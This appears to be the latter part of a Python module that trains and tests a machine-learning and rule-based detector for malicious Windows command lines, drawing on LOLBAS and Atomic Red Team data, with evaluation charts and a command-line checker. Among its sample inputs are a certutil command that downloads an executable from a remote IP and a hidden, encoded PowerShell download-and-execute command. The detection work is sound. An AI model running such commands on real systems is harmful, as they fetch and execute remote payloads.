    idx_train, idx_test = group_split(rows, 0.2)
    train_rows, test_rows = [rows[i] for i in idx_train], [rows[i] for i in idx_test]
    print(f"\nTrain/test split: {len(train_rows)} train (80%), {len(test_rows)} test (20%)")
    print("Model: TF-IDF (character 2-5 grams + words) -> Logistic Regression")
    rules = Rules(train_rows)
    pipeline = fit_pipeline([rows[i]["command"] for i in idx_train], y[idx_train], "Training (test 1)")
    model = CommandModel(pipeline, rules)
    prob = model.probability([r["command"] for r in test_rows], "Scoring test set")
    ml_flag = prob >= THRESHOLD
    show("--- Test 1: random 80/20 split, classifier alone ---", y[idx_test], ml_flag, prob)
    # the benign commands that matter most are the real ones: how many of those are called malicious?
    for source in ("endpoint", "synthetic-benign"):
        at = [k for k, r in enumerate(test_rows) if r["source"] == source]
        if at:
            print(f"False alarms among the {len(at)} benign test commands from '{source}': {int(ml_flag[at].sum())} ({ml_flag[at].mean():.1%})")
    rule_flag = np.array([model.rules.match(r["command"]) is not None for r in bar(test_rows, "Matching LOLBAS rules")])
    show("--- Test 1: rules alone (LOLBAS switches) ---", y[idx_test], rule_flag)
    show("--- Test 1: rules + classifier (what the system uses) ---", y[idx_test], rule_flag | ml_flag, np.maximum(prob, rule_flag.astype(float)))

    # --- 2. the honest test: learn from LOLBAS, test on Atomic Red Team, which the model has never seen
    lolbas = [r for r in rows if r["source"] == "lolbas"]
    atomic = [r for r in rows if r["source"] == "atomic"]
    benign = [r for r in rows if r["label"] == 0]
    if lolbas and atomic:
        keep, held = group_split(benign, 0.3)
        b_train, b_test = [benign[i] for i in keep], [benign[i] for i in held]
        train2 = lolbas + b_train
        test2 = atomic + b_test
        y2 = np.array([r["label"] for r in test2])
        p2 = fit_pipeline([r["command"] for r in train2], [r["label"] for r in train2], "Training (test 2)")
        rules2 = Rules(train2)
        m2 = CommandModel(p2, rules2)
        prob2 = m2.probability([r["command"] for r in test2], "Scoring test set 2")
        ml2 = prob2 >= THRESHOLD
        rule2 = np.array([rules2.match(r["command"]) is not None for r in bar(test2, "Matching LOLBAS rules")])
        print("\n" + "=" * 70)
        print(f"Test 2: unseen source. Learn from LOLBAS + {len(b_train)} benign; test on {len(atomic)} Atomic Red Team")
        print(f"commands + {len(b_test)} benign. The model has never seen a command written by Atomic Red Team.")
        print("=" * 70)
        show("--- Test 2: classifier alone ---", y2, ml2, prob2)
        show("--- Test 2: rules alone ---", y2, rule2)
        show("--- Test 2: rules + classifier ---", y2, rule2 | ml2, np.maximum(prob2, rule2.astype(float)))

    # --- what the classifier learned
    names = np.array(pipeline.named_steps["tfidf"].get_feature_names_out())
    coef = pipeline.named_steps["clf"].coef_[0]
    order = np.argsort(coef)
    print("\n--- Top features (largest logistic-regression coefficients) ---")
    print("Pushing towards malicious:")
    for k in order[::-1][:10]:
        print(f"  {coef[k]:+8.3f}  {names[k].split('__', 1)[-1]!r}")
    print("Pushing towards benign:")
    for k in order[:10]:
        print(f"  {coef[k]:+8.3f}  {names[k].split('__', 1)[-1]!r}")
    if charts:
        results = {
            "rows": rows, "y": y[idx_test], "prob": prob, "flag": ml_flag, "names": names, "coef": coef, "order": order,
            "test_rows": test_rows,
        }  # fmt: skip
        if lolbas and atomic:
            results.update({"y2": y2, "prob2": prob2, "flag2": ml2, "test2": test2})
        draw_charts(results, show_windows)

    # the model the backend will use learns from everything
    return CommandModel(fit_pipeline([r["command"] for r in rows], y, "Training final model"), Rules(rows))


def draw_charts(r: dict, show_windows: bool = False) -> None:
    """Seven charts, saved to ml_reports/commands/ (and opened in windows with --show)."""
    import matplotlib

    if not show_windows:
        matplotlib.use("Agg")
    import matplotlib.pyplot as plt
    from sklearn.metrics import auc, precision_recall_curve

    BLUE, ORANGE, GREY = "#2f6fb0", "#d9822b", "#8a8f98"
    REPORTS.mkdir(parents=True, exist_ok=True)
    names, saved = ["benign", "malicious"], []

    def done(fig, name: str) -> None:
        fig.tight_layout()
        fig.savefig(REPORTS / name, dpi=130)
        saved.append(name)
        if not show_windows:
            plt.close(fig)

    # 1. what the dataset is made of
    counts = Counter((x["source"], x["label"]) for x in r["rows"])
    sources = sorted({s for s, _ in counts}, key=lambda s: -sum(v for (k, _), v in counts.items() if k == s))
    fig, ax = plt.subplots(figsize=(7, 3.4))
    ax.barh(sources, [counts[(s, 0)] + counts[(s, 1)] for s in sources], color=[BLUE if counts[(s, 0)] else ORANGE for s in sources])
    for i, s in enumerate(sources):
        ax.text(counts[(s, 0)] + counts[(s, 1)], i, f" {counts[(s, 0)] + counts[(s, 1)]:,}", va="center", fontsize=9)
    ax.invert_yaxis()
    ax.set_xlabel("commands")
    ax.set_title("Dataset: blue = benign, orange = malicious")
    done(fig, "1_dataset_composition.png")

    # 2. confusion matrices
    tests = [("Test 1: 80/20 split", r["y"], r["flag"])] + ([("Test 2: unseen source", r["y2"], r["flag2"])] if "y2" in r else [])
    fig, axes = plt.subplots(1, len(tests), figsize=(4.6 * len(tests), 4))
    for ax, (title, y, flag) in zip(np.atleast_1d(axes), tests):
        cm = confusion_matrix(y, flag.astype(int), labels=[0, 1])
        ax.imshow(cm, cmap="Blues")
        for (i, j), v in np.ndenumerate(cm):
            ax.text(j, i, f"{v:,}", ha="center", va="center", color="white" if v > cm.max() / 2 else "black", fontsize=12)
        ax.set_xticks([0, 1], names)
        ax.set_yticks([0, 1], names)
        ax.set_xlabel("predicted")
        ax.set_ylabel("actual")
        ax.set_title(title)
    done(fig, "2_confusion_matrix.png")

    # 3. ROC and 4. precision-recall, both tests
    curves = [("Test 1", r["y"], r["prob"], BLUE)] + ([("Test 2 (unseen source)", r["y2"], r["prob2"], ORANGE)] if "y2" in r else [])
    fig, ax = plt.subplots(figsize=(5, 4.4))
    for label, y, p, color in curves:
        fpr, tpr, _ = roc_curve(y, p)
        ax.plot(fpr, tpr, color=color, label=f"{label} (AUC {roc_auc_score(y, p):.3f})")
    ax.plot([0, 1], [0, 1], "--", color=GREY)
    ax.set_xlabel("false-positive rate")
    ax.set_ylabel("recall (true-positive rate)")
    ax.set_title("ROC curve")
    ax.legend(loc="lower right")
    done(fig, "3_roc_curve.png")
    fig, ax = plt.subplots(figsize=(5, 4.4))
    for label, y, p, color in curves:
        precision, recall, _ = precision_recall_curve(y, p)
        ax.plot(recall, precision, color=color, label=f"{label} (AUC {auc(recall, precision):.3f})")
    ax.set_xlabel("recall")
    ax.set_ylabel("precision")
    ax.set_title("Precision-recall curve")
    ax.legend(loc="lower left")
    done(fig, "4_precision_recall_curve.png")

    # 5. how far apart the two classes are
    fig, ax = plt.subplots(figsize=(6.5, 4))
    ax.hist(r["prob"][r["y"] == 0], bins=40, alpha=0.75, color=BLUE, label="benign")
    ax.hist(r["prob"][r["y"] == 1], bins=40, alpha=0.75, color=ORANGE, label="malicious")
    ax.axvline(THRESHOLD, color="black", linestyle="--", linewidth=1)
    ax.set_yscale("log")
    ax.set_xlabel("predicted chance of being malicious")
    ax.set_ylabel("commands (log scale)")
    ax.set_title(f"Score distribution on the test set (dashed line = threshold {THRESHOLD})")
    ax.legend()
    done(fig, "5_score_distribution.png")

    # 6. what the classifier looks at
    order, coef, feats = r["order"], r["coef"], r["names"]
    top = list(order[:12]) + list(order[::-1][:12][::-1])
    fig, ax = plt.subplots(figsize=(7.5, 6.5))
    ax.barh([feats[k].split("__", 1)[-1][:34] for k in top], [coef[k] for k in top], color=[BLUE if coef[k] < 0 else ORANGE for k in top])
    ax.set_xlabel("coefficient (blue: benign, orange: malicious)")
    ax.set_title("Strongest features")
    done(fig, "6_top_features.png")

    # 7. which attack techniques of the unseen source are caught
    if "test2" in r:
        by_tech: dict[str, list[int]] = {}
        for row, flag in zip(r["test2"], r["flag2"]):
            if row["source"] == "atomic":
                by_tech.setdefault((row["technique"] or "?").split(".")[0], []).append(int(flag))
        common = sorted(by_tech.items(), key=lambda kv: -len(kv[1]))[:20]
        fig, ax = plt.subplots(figsize=(7.5, 6))
        ax.barh([f"{t} ({len(v)})" for t, v in common], [np.mean(v) for _, v in common], color=BLUE)
        ax.invert_yaxis()
        ax.set_xlim(0, 1)
        ax.set_xlabel("share of the technique's commands flagged (test 2, classifier alone)")
        ax.set_title("Recall by ATT&CK technique (the 20 with most commands)")
        done(fig, "7_recall_by_technique.png")

    print(f"\nCharts saved to {REPORTS}")
    for name in saved:
        print(f"  {name}")
    if show_windows:
        plt.show()


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__.split("\n", 1)[0])
    parser.add_argument("--rebuild", action="store_true", help="build the dataset again from the public projects")
    parser.add_argument("--no-charts", action="store_true", help="do not draw the charts")
    parser.add_argument("--show", action="store_true", help="also open the charts in windows (they are always saved to ml_reports/commands/)")
    parser.add_argument("--classify", metavar="COMMAND", help="check one command with the saved model")
    args = parser.parse_args()

    if args.classify:
        result = load().check(args.classify)
        print(f"Command:      {args.classify}")
        print(f"Prediction:   {'MALICIOUS' if result['malicious'] else 'benign'}")
        print(f"Probability:  {result['probability']:.4f}  (chance the command is malicious; flagged from {THRESHOLD})")
        if result["confirmed"]:
            print(f"Rule match:   {result['technique']}  {result['category']}  (a known LOLBAS technique, so confirmed)")
        else:
            print("Rule match:   none (decided by the classifier)")
        return
    if args.rebuild or not COMMANDS_CSV.exists():
        rows = build_dataset()
        print(f"Dataset built: {len(rows)} commands -> {COMMANDS_CSV}\n")
    else:
        rows = load_dataset()
    model = run_tests(rows, charts=not args.no_charts, show_windows=args.show)
    save(model)
    print(f"\nModel saved to {MODEL_PATH}  ({model.rules.entries} LOLBAS rules)")
    print("\n--- Example predictions (final model, trained on all the data) ---")
    print(f"{'prediction':<11} {'probability':>11}  {'rule':<12} command")
    for example in [
        "certutil -hashfile C:\\Windows\\notepad.exe SHA256",
        "certutil -urlcache -f http://198.51.100.7/a.exe C:\\Users\\Public\\a.exe",
        "whoami",
        "powershell -nop -w hidden -enc " + "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA" * 2,
    ]:
        r = model.check(example)
        print(f"{'MALICIOUS' if r['malicious'] else 'benign':<11} {r['probability']:>11.4f}  {r['technique'] or '-':<12} {example[:80]}")


if __name__ == "__main__":
    # Run the module under its own name, not as __main__: the saved model remembers the module of its
    # classes, and the backend can only load it if that is app.services.ml.commands.
    from app.services.ml.commands import main as _main

    _main()
